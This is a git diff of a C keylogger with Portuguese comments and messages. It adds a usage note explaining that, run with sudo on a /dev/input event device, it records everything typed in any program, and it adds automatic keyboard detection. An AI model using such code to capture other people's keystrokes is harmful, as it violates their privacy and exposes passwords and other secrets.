@@ -1,3 +1,9 @@
+/* Como usar:
+1. Execute make build no diretorio /projeto
+2. Em seguida, execute no linha de comando: sudo ./bin/out.out /dev/input/eventX 
+3. Agora basta escrever em qualquer programa o terminal estará salvando.
+PS: é peciso que voce descubra qual o event que está associado ao seu teclado.*/
+
 #include <stdio.h>
 #include <fcntl.h>
 #include <stdlib.h>
@@ -5,6 +11,7 @@
 #include <stdbool.h>
 #include <linux/input.h>
 #include "logger.h"
+#include "findKeyboard.h"
 
 // #define TAM_MAX 50
 
@@ -15,14 +22,18 @@ typedef struct{
 } keymap_entry;
 
 int main(int argc, char* argv[]){
-    if(argc != 2){
-        printf("Deu erro, lek\n");
+    char *path = findKeyboard();
+
+    if(path == NULL){
+        printf("Teclado não encontrado\n");
         exit(EXIT_FAILURE);
+    }else{
+        printf("Teclado encontrado!\n");
     }
     
-    int fin = open(argv[1], O_RDONLY);
+    int fin = open(path, O_RDONLY);
     if(fin < 0){
-       perror("Deu merda, menor");
+       perror("Erro ao tentar abrir o dispositivo\n");
        exit(EXIT_FAILURE);
     }
 
